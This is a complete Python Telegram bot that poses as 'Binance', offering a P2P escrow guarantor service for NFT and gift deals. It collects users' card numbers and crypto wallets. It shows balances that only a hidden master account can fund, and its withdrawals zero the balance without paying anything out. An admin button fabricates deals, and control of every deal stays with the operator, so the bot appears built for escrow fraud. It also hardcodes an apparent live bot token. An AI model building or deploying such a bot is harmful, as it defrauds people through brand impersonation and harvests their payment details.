import asyncio
import logging
import os
import sys
import signal
import random
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery, URLInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = os.getenv("BOT_TOKEN", "8916641100:AAGTlz5A0Xr3ShfmG197dMN6Kp359c-NMxc")
MASTER_ID = int(os.getenv("MASTER_ID", "8297446667"))
BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
PORT = int(os.getenv("PORT", 8080))

# ---------- ID ПРЕМИУМ-ЭМОДЗИ (ЗАМЕНИТЕ НА СВОИ) ----------
EMOJI = {
    "ton": "1111111111111111111",
    "card": "2222222222222222222",
    "user": "3333333333333333333",
    "stars": "4444444444444444444",
    "usdt": "5555555555555555555",
    "btc": "6666666666666666666",
    "ruble": "7777777777777777777",
    "people": "8888888888888888888",
    "money": "9999999999999999999",
}

users = {}
deals = {}
deal_counter = 1000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

WELCOME_TEXT = (
    "💼 Добро пожаловать в Binance 🤝\n\n"
    "<blockquote>⚡️ Ваш надёжный P2P-гарант:\n"
    "1⃣ Автоматические сделки с NFT и подарками\n"
    "2⃣ 🛡 Полная защита обеих сторон\n"
    "3⃣ 🪙 Реферальная программа — 50% от комиссии\n"
    "4⃣ 📦 Передача товаров через менеджера</blockquote>\n\n"
    "💡 Наш канал ─ @binance_announcements"
)

ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"

class DealStates(StatesGroup):
    waiting_role = State()
    waiting_currency = State()
    waiting_amount = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_deal_id = State()

def get_lang(uid): return users.get(uid, {}).get("lang", "ru")

def emoji(name):
    return f"<tg-emoji emoji-id='{EMOJI.get(name, '')}'></tg-emoji>"

# ---------- КЛАВИАТУРЫ ----------
def main_menu(lang="ru"):
    t = {
        "ru": ["💰 Баланс", "📋 Мои сделки", "🤝 Создать сделку",
               "📄 Реквизиты", "👥 Рефералы", "🌐 Язык / Language", "🆘 Техподдержка"],
        "en": ["💰 Balance", "📋 My Deals", "🤝 New Deal",
               "📄 My Details", "👥 Referrals", "🌐 Language / Язык", "🆘 Support"]
    }[lang]
    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang", "support"]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data=callbacks[0]),
         InlineKeyboardButton(text=t[1], callback_data=callbacks[1])],
        [InlineKeyboardButton(text=t[2], callback_data=callbacks[2]),
         InlineKeyboardButton(text=t[3], callback_data=callbacks[3])],
        [InlineKeyboardButton(text=t[4], callback_data=callbacks[4]),
         InlineKeyboardButton(text=t[5], callback_data=callbacks[5])],
        [InlineKeyboardButton(text=t[6], callback_data=callbacks[6])]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def admin_menu():
    kb = [
        [InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="✅ Завершить сделку", callback_data="admin_complete_deal")],
        [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🔢 Тестовые сделки", callback_data="admin_fake_deals")],
        [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def balance_menu(lang="ru"):
    t = {"ru": ["📜 История транзакций", "💸 Вывод средств", "🔙 Назад"],
         "en": ["📜 Transaction History", "💸 Withdraw", "🔙 Back"]}[lang]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data="tx_history"),
         InlineKeyboardButton(text=t[1], callback_data="withdraw_funds")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def rekv_menu(lang="ru"):
    items = ["ton","card","username","stars","usdt","btc"]
    labels_ru = [f"{emoji('ton')} TON", f"{emoji('card')} Карта", f"{emoji('user')} Юзернейм",
                 f"{emoji('stars')} Звезды", f"{emoji('usdt')} USDT", f"{emoji('btc')} BTC"]
    labels_en = [f"{emoji('ton')} TON", f"{emoji('card')} Card", f"{emoji('user')} Username",
                 f"{emoji('stars')} Stars", f"{emoji('usdt')} USDT", f"{emoji('btc')} BTC"]
    labels = labels_ru if lang=="ru" else labels_en
    kb = []
    for i in range(0, 6, 3):
        row = [InlineKeyboardButton(text=labels[j], callback_data=f"set_{items[j]}") for j in range(i, min(i+3,6))]
        kb.append(row)
    kb.append([InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def deal_role_choice(lang="ru"):
    t = {"ru": ["🛒 Я продавец", "🛍 Я покупатель", "🔙 Отмена"],
         "en": ["🛒 I'm Seller", "🛍 I'm Buyer", "🔙 Cancel"]}[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t[0], callback_data="role_seller"),
         InlineKeyboardButton(text=t[1], callback_data="role_buyer")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ])

def currency_choice(lang="ru"):
    cur = [(f"{emoji('ton')} TON", "ton"), (f"{emoji('card')} Карта", "card"),
           (f"{emoji('user')} Юзернейм", "username"), (f"{emoji('stars')} Звезды", "stars"),
           (f"{emoji('usdt')} USDT", "usdt"), (f"{emoji('btc')} BTC", "btc")]
    kb = []
    for i in range(0, 6, 3):
        row = [InlineKeyboardButton(text=c[0], callback_data=f"cur_{c[1]}") for c in cur[i:i+3]]
        kb.append(row)
    kb.append([InlineKeyboardButton(text="🔙 Отмена" if lang=="ru" else "🔙 Cancel", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]
    ])

# ---------- УДАЛЕНИЕ СТАРОГО И ОТПРАВКА НОВОГО ----------
async def _delete_message(chat_id, msg_id):
    try: await bot.delete_message(chat_id, msg_id)
    except: pass

async def delete_and_send(call: CallbackQuery, text: str, reply_markup=None):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = await call.message.answer(text, reply_markup=reply_markup)
    users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id

async def return_to_main(call: CallbackQuery, lang: str):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await call.message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=WELCOME_TEXT,
                reply_markup=main_menu(lang)
            )
        except: pass
    if not new_msg:
        new_msg = await call.message.answer(WELCOME_TEXT, reply_markup=main_menu(lang))
    users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id

def username_or_id(uid):
    if uid is None: return "—"
    u = users.get(uid, {})
    if "username" in u and u["username"]: return f"@{u['username']}"
    return str(uid)

def deal_status_text(deal):
    if deal["status"] == "completed": return "Завершена"
    if deal["status"] == "active":
        if deal["seller_id"] is None: return "Ожидание продавца"
        if deal["buyer_id"] is None: return "Ожидание покупателя"
        return "Проворачивание сделки"
    return deal["status"]

async def complete_deal_logic(deal_id, msg=None, call=None):
    d = deals[deal_id]
    seller_id = d["seller_id"]
    buyer_id = d["buyer_id"]
    amt = d["amount"]

    if seller_id is None or buyer_id is None:
        txt = "❌ Нельзя завершить сделку: отсутствует продавец или покупатель."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    buyer_balance = users.get(buyer_id, {}).get("balance", 0)
    if buyer_balance < amt:
        txt = f"❌ У покупателя (ID {buyer_id}) недостаточно средств. Баланс: {buyer_balance} {emoji('ruble')}, требуется: {amt} {emoji('ruble')}."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    users[buyer_id]["balance"] -= amt
    users[buyer_id].setdefault("history", []).append(f"💸 Сделка #{deal_id}: -{amt} {emoji('ruble')}")

    if seller_id not in users:
        users[seller_id] = {"balance": 0, "history": []}
    users[seller_id]["balance"] += amt
    users[seller_id].setdefault("history", []).append(f"✅ Сделка #{deal_id}: +{amt} {emoji('ruble')}")

    d["status"] = "completed"
    txt = f"✅ Сделка #{deal_id} завершена. Продавец получил {amt} {emoji('ruble')}."
    if msg: await msg.answer(txt)
    if call: await call.message.edit_text(txt, reply_markup=admin_menu())
    try:
        await bot.send_message(seller_id, f"✅ Сделка #{deal_id} завершена! +{amt} {emoji('ruble')}.")
        await bot.send_message(buyer_id, f"✅ Сделка #{deal_id} завершена. С вашего баланса списано {amt} {emoji('ruble')}.")
    except: pass

# ---------- /start ----------
@dp.message(Command("start"))
async def cmd_start(message: Message):
    uid = message.from_user.id
    args = message.text.split()
    ref_id = None

    if len(args) > 1 and args[1].startswith("deal_"):
        try:
            deal_id = int(args[1].split("_")[1])
            if deal_id in deals and deals[deal_id]["status"] == "active":
                d = deals[deal_id]
                if d["seller_id"] is None and d["buyer_id"] != uid:
                    d["seller_id"] = uid
                elif d["buyer_id"] is None and d["seller_id"] != uid:
                    d["buyer_id"] = uid
                else:
                    return await message.answer("❌ Вы уже участвуете или сделка заполнена.")
                if d["seller_id"] is not None and d["buyer_id"] is not None:
                    d["status"] = "active"
                other_id = d["seller_id"] if d["seller_id"] != uid else d["buyer_id"]
                if other_id:
                    try:
                        await bot.send_message(other_id,
                            f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
                            f"Продавец: {username_or_id(d['seller_id'])}\n"
                            f"Покупатель: {username_or_id(d['buyer_id'])}\n"
                            f"Статус: {deal_status_text(d)}\n"
                            f"Сумма: {d['amount']} {d['currency']}"
                        )
                    except: pass
                return await message.answer(
                    f"✅ Вы присоединились к сделке #{deal_id}!\n\n"
                    f"Продавец: {username_or_id(d['seller_id'])}\n"
                    f"Покупатель: {username_or_id(d['buyer_id'])}\n"
                    f"Статус: {deal_status_text(d)}\n"
                    f"Сумма: {d['amount']} {d['currency']}",
                    reply_markup=main_menu(get_lang(uid))
                )
        except: pass

    if len(args) > 1:
        try: ref_id = int(args[1])
        except: pass

    if uid not in users:
        users[uid] = {
            "balance": 0.0, "ton": "", "card": "", "username": "", "stars": "", "usdt": "", "btc": "",
            "lang": "ru", "history": [], "pending_rekv": None, "referrer_id": ref_id, "referrals": [],
            "last_menu_msg_id": None
        }
        if ref_id and ref_id != uid and ref_id in users:
            users[ref_id]["balance"] += 2.0
            users[ref_id].setdefault("history", []).append(f"🎁 Реферал: +2 {emoji('ruble')} от {uid}")
            users[ref_id].setdefault("referrals", []).append(uid)
            try: await bot.send_message(ref_id, f"🎁 +2 {emoji('ruble')} за друга!")
            except: pass

    last_msg_id = users[uid].get("last_menu_msg_id")
    if last_msg_id:
        await _delete_message(message.chat.id, last_msg_id)

    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=WELCOME_TEXT,
                reply_markup=main_menu(get_lang(uid))
            )
        except: pass
    if not new_msg:
        new_msg = await message.answer(WELCOME_TEXT, reply_markup=main_menu(get_lang(uid)))

    users[uid]["last_menu_msg_id"] = new_msg.message_id

# ---------- АДМИН-КОМАНДЫ ----------
@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    await message.answer(ADMIN_TEXT, reply_markup=admin_menu())

@dp.message(Command("masterb"))
async def masterb_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Зачисление: +{amt} {emoji('ruble')}")
        await message.answer(f"✅ Пользователю {uid} выдано {amt} {emoji('ruble')}.")
        try: await bot.send_message(uid, f"💰 На ваш баланс зачислено {amt} {emoji('ruble')}.")
        except: pass
    except: await message.answer("❌ Формат: /masterb user_id сумма")

@dp.message(Command("giveMas"))
async def givemas_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        if did not in deals or deals[did]["status"] != "active":
            return await message.answer("❌ Сделка не найдена или неактивна.")
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Формат: /giveMas deal_id")

# ---------- ГЛАВНОЕ МЕНЮ ----------
@dp.callback_query(F.data == "main_menu")
async def main_menu_cb(call: CallbackQuery):
    await return_to_main(call, get_lang(call.from_user.id))

# ---------- АДМИН КОЛБЭКИ ----------
@dp.callback_query(F.data == "admin_add_balance")
async def adm_add_bal(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send(call, "Введите ID пользователя и сумму через пробел:\nПример: 123456789 500", back_button("ru"))
    await state.set_state(AdminStates.waiting_user_id)

@dp.message(AdminStates.waiting_user_id)
async def adm_bal_proc(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ID: return
    try:
        uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Админ: +{amt} {emoji('ruble')}")
        await message.answer(f"✅ Баланс {uid} пополнен на {amt} {emoji('ruble')}.", reply_markup=admin_menu())
    except: await message.answer("❌ Формат: user_id сумма")
    await state.clear()

@dp.callback_query(F.data == "admin_complete_deal")
async def adm_compl(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send(call, "Введите ID сделки для завершения:", back_button("ru"))
    await state.set_state(AdminStates.waiting_deal_id)

@dp.message(AdminStates.waiting_deal_id)
async def adm_compl_proc(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ID: return
    try:
        did = int(message.text.strip())
        if did not in deals or deals[did]["status"]!="active":
            return await message.answer("❌ Сделка не найдена или неактивна.", reply_markup=admin_menu())
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Введите корректный ID сделки.")
    await state.clear()

@dp.callback_query(F.data == "admin_all_deals")
async def adm_all_deals(call: CallbackQuery):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    if not deals: return await delete_and_send(call, "📭 Сделок нет.", admin_menu())
    txt = "📋 Все сделки:\n\n" + "\n".join(
        [f"#{did}: {d['amount']} {d['currency']} | Продавец: {username_or_id(d['seller_id'])} | Покупатель: {username_or_id(d['buyer_id'])} | Статус: {deal_status_text(d)}" for did,d in deals.items()]
    )
    await delete_and_send(call, txt, admin_menu())

@dp.callback_query(F.data == "admin_stats")
async def adm_stats(call: CallbackQuery):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    total_users = len(users)
    total_deals = len(deals)
    active_deals = sum(1 for d in deals.values() if d["status"] == "active")
    total_balance = sum(u.get("balance", 0) for u in users.values())
    txt = f"📊 Статистика:\n\n👥 Пользователей: {total_users}\n📋 Сделок: {total_deals}\n🟢 Активных: {active_deals}\n💰 Общий баланс: {total_balance} {emoji('ruble')}"
    await delete_and_send(call, txt, admin_menu())

@dp.callback_query(F.data == "admin_fake_deals")
async def adm_fake(call: CallbackQuery):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    global deal_counter
    cur_list = ["ton","card","username","stars","usdt","btc"]
    cnt = random.randint(0, 40)
    for _ in range(cnt):
        deal_counter += 1
        deals[deal_counter] = {
            "seller_id": random.choice(list(users.keys())) if users else MASTER_ID,
            "buyer_id": random.choice(list(users.keys())) if users else MASTER_ID,
            "amount": round(random.uniform(100, 10000), 2),
            "currency": random.choice(cur_list),
            "status": "active"
        }
    await delete_and_send(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu())

# ---------- БАЛАНС ----------
@dp.callback_query(F.data == "balance_menu")
async def balance_menu_handler(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    bal = users.get(uid, {}).get("balance", 0)
    txt = (
        f"💰 Ваш баланс: {bal:.2f} {emoji('ruble')}\n\n"
        "🔹 Здесь отображаются ваши средства, заработанные на сделках и рефералах.\n"
        "Вы можете вывести их на свои реквизиты."
    ) if lang=="ru" else (
        f"💰 Your balance: {bal:.2f} {emoji('ruble')}\n\n"
        "🔹 View your earnings from deals and referrals.\n"
        "Withdraw to your payment details."
    )
    await delete_and_send(call, txt, balance_menu(lang))

@dp.callback_query(F.data == "tx_history")
async def tx_history_handler(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    h = users.get(uid, {}).get("history", [])
    txt = "📜 История транзакций:\n" + ("\n".join(h[-15:]) if h else "Пусто")
    await delete_and_send(call, txt, back_button(lang))

@dp.callback_query(F.data == "withdraw_funds")
async def withdraw_funds_handler(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    b = users.get(uid, {}).get("balance", 0)
    if b <= 0:
        await call.answer("❌ Недостаточно средств" if lang=="ru" else "❌ Insufficient funds", show_alert=True)
        return
    users[uid]["balance"] = 0.0
    users[uid].setdefault("history", []).append(f"💸 Вывод: -{b:.2f} {emoji('ruble')}")
    await delete_and_send(call, f"✅ Заявка на вывод {b:.2f} {emoji('ruble')} принята. Ожидайте обработки менеджером.", back_button(lang))

# ---------- РЕКВИЗИТЫ ----------
@dp.callback_query(F.data == "my_rekv")
async def rekv_handler(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    u = users.get(uid, {})
    lbl = {"ton":f"{emoji('ton')} TON","card":f"{emoji('card')} Карта","username":f"{emoji('user')} Юзернейм",
           "stars":f"{emoji('stars')} Звезды","usdt":f"{emoji('usdt')} USDT","btc":f"{emoji('btc')} BTC"}
    entries = [f"{v}: {u.get(k, '❌ не указан')}" for k,v in lbl.items()]
    txt = "📄 Ваши реквизиты для получения средств:\n\n" + "\n".join(entries)
    await delete_and_send(call, txt, rekv_menu(lang))

for cb, key in [("set_ton","ton"),("set_card","card"),("set_username","username"),
                ("set_stars","stars"),("set_usdt","usdt"),("set_btc","btc")]:
    @dp.callback_query(F.data == cb)
    async def ask_rekv(call: CallbackQuery, key=key):
        uid = call.from_user.id; lang = get_lang(uid)
        prompts = {
            "ton": (f"Введите {emoji('ton')} TON кошелёк:", f"Enter {emoji('ton')} TON wallet:"),
            "card": (f"Введите {emoji('card')} номер карты:", f"Enter {emoji('card')} card number:"),
            "username": (f"Введите {emoji('user')} юзернейм:", f"Enter {emoji('user')} username:"),
            "stars": (f"Введите {emoji('stars')} ID звёзд:", f"Enter {emoji('stars')} Stars ID:"),
            "usdt": (f"Введите {emoji('usdt')} USDT кошелёк:", f"Enter {emoji('usdt')} USDT wallet:"),
            "btc": (f"Введите {emoji('btc')} BTC кошелёк:", f"Enter {emoji('btc')} BTC wallet:")
        }
        users[uid]["pending_rekv"] = key
        await delete_and_send(call, prompts[key][0] if lang=="ru" else prompts[key][1], back_button(lang))

# ---------- СДЕЛКИ ----------
@dp.callback_query(F.data == "new_deal")
async def new_deal_handler(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = get_lang(call.from_user.id)
    txt = (
        "🤝 Создание P2P сделки\n\n"
        "Выберите свою роль в сделке:\n"
        "• Продавец — вы получите оплату после подтверждения менеджером.\n"
        "• Покупатель — вы получите товар после оплаты."
    ) if lang=="ru" else (
        "🤝 New P2P deal\n\n"
        "Choose your role:\n"
        "• Seller — you'll receive payment after manager confirmation.\n"
        "• Buyer — you'll receive the item after payment."
    )
    await delete_and_send(call, txt, deal_role_choice(lang))
    await state.set_state(DealStates.waiting_role)

@dp.callback_query(F.data.startswith("role_"), DealStates.waiting_role)
async def role_chosen(call: CallbackQuery, state: FSMContext):
    role = "seller" if call.data == "role_seller" else "buyer"
    await state.update_data(role=role)
    lang = get_lang(call.from_user.id)
    await delete_and_send(call, "Выберите валюту, которой продавец получит деньги:", currency_choice(lang))
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(F.data.startswith("cur_"), DealStates.waiting_currency)
async def currency_chosen(call: CallbackQuery, state: FSMContext):
    cur = call.data.replace("cur_", "")
    await state.update_data(currency=cur)
    lang = get_lang(call.from_user.id)
    await delete_and_send(call, f"💰 Введите сумму сделки (в {emoji('ruble')}):", back_button(lang))
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount)
async def amount_entered(message: Message, state: FSMContext):
    global deal_counter
    uid = message.from_user.id
    lang = get_lang(uid)
    try:
        amt = float(message.text)
        if amt <= 0: raise ValueError
    except:
        return await message.answer("❌ Введите корректное положительное число.")
    data = await state.get_data()
    role = data["role"]
    currency = data["currency"]

    deal_counter += 1
    seller_id = uid if role == "seller" else None
    buyer_id = uid if role == "buyer" else None

    deals[deal_counter] = {
        "seller_id": seller_id,
        "buyer_id": buyer_id,
        "amount": amt,
        "currency": currency,
        "status": "active"
    }

    link = f"https://t.me/{(await bot.me()).username}?start=deal_{deal_counter}"

    text = (
        f"✅ Сделка #{deal_counter} создана!\n\n"
        f"👤 Продавец: {username_or_id(seller_id)}\n"
        f"👤 Покупатель: {username_or_id(buyer_id)}\n"
        f"📌 Статус: {deal_status_text(deals[deal_counter])}\n"
        f"💰 Сумма: {amt} {emoji('ruble')} ({currency})\n\n"
        f"🔗 Отправьте эту ссылку второй стороне для присоединения:\n{link}\n\n"
        f"После входа обеих сторон менеджер завершит сделку."
    )
    await message.answer(text, reply_markup=main_menu(lang))
    await state.clear()

# ---------- МОИ СДЕЛКИ ----------
@dp.callback_query(F.data == "my_deals")
async def my_deals_handler(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    user_deals = [(did, d) for did, d in deals.items() if d["seller_id"] == uid or d["buyer_id"] == uid]
    if not user_deals:
        await delete_and_send(call, "🔍 У вас пока нет активных сделок.", back_button(lang))
        return
    txt = "📋 Ваши сделки:\n\n" + "\n".join(
        [f"🔹 #{did}: {d['amount']} {emoji('ruble')} ({d['currency']}) | Статус: {deal_status_text(d)}" for did, d in user_deals]
    )
    txt += "\n\n🔎 Быстрый поиск: /search код_сделки"
    await delete_and_send(call, txt, back_button(lang))

@dp.message(Command("search"))
async def search_cmd(message: Message):
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        d = deals.get(did)
        if d:
            await message.answer(
                f"🔍 Сделка #{did}:\n"
                f"Продавец: {username_or_id(d['seller_id'])}\n"
                f"Покупатель: {username_or_id(d['buyer_id'])}\n"
                f"Сумма: {d['amount']} {emoji('ruble')} ({d['currency']})\n"
                f"Статус: {deal_status_text(d)}"
            )
        else:
            await message.answer("❌ Сделка не найдена.")
    except:
        await message.answer("❌ Формат: /search код_сделки")

# ---------- РЕФЕРАЛЫ ----------
@dp.callback_query(F.data == "referrals")
async def referrals_handler(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    refs = users.get(uid, {}).get("referrals", [])
    bot_username = (await bot.me()).username
    link = f"https://t.me/{bot_username}?start={uid}"
    txt = (
        f"👥 Партнёрская программа\n\n"
        f"Приглашайте друзей и получайте 2 {emoji('ruble')} за каждого активного реферала!\n\n"
        f"🔗 Ваша ссылка:\n{link}\n\n"
        f"👤 Приглашено: {len(refs)} {emoji('people')}\n"
        f"💰 Заработано: {len(refs)*2} {emoji('ruble')}"
    ) if lang=="ru" else (
        f"👥 Referral Program\n\n"
        f"Invite friends and earn 2 {emoji('ruble')} for each!\n\n"
        f"🔗 Your link:\n{link}\n\n"
        f"👤 Invited: {len(refs)} {emoji('people')}\n"
        f"💰 Earned: {len(refs)*2} {emoji('ruble')}"
    )
    await delete_and_send(call, txt, back_button(lang))

# ---------- ЯЗЫК ----------
@dp.callback_query(F.data == "change_lang")
async def lang_cb(call: CallbackQuery):
    uid = call.from_user.id
    cur_lang = users.setdefault(uid, {}).setdefault("lang", "ru")
    new_lang = "en" if cur_lang == "ru" else "ru"
    users[uid]["lang"] = new_lang
    await return_to_main(call, new_lang)

# ---------- ТЕХПОДДЕРЖКА ----------
@dp.callback_query(F.data == "support")
async def support_handler(call: CallbackQuery):
    lang = get_lang(call.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Написать @dumufa", url="https://t.me/dumufa")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ])
    await delete_and_send(call, "🆘 Техподдержка\n\nСвяжитесь с менеджером: @dumufa", kb)

# ---------- ВВОД РЕКВИЗИТОВ ----------
@dp.message()
async def handle_rekv_input(message: Message):
    uid = message.from_user.id
    if uid in users and users[uid].get("pending_rekv"):
        key = users[uid]["pending_rekv"]
        users[uid][key] = message.text
        users[uid]["pending_rekv"] = None
        lang = get_lang(uid)
        await message.answer("✅ Сохранено!", reply_markup=main_menu(lang))

# ---------- HTTP-СЕРВЕР ----------
async def handle_health(request):
    return web.Response(text="OK", status=200)

async def run_web_server():
    app = web.Application()
    app.router.add_get("/", handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logging.info(f"HTTP server started on port {PORT}")

# ---------- ЗАПУСК ----------
async def main():
    logging.info("Запуск бота и HTTP-сервера...")
    try: await bot.session.close()
    except: pass
    await bot.delete_webhook(drop_pending_updates=True)
    await run_web_server()
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types(), polling_timeout=20, handle_as_tasks=True)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda s,f: sys.exit(0))
    asyncio.run(main())
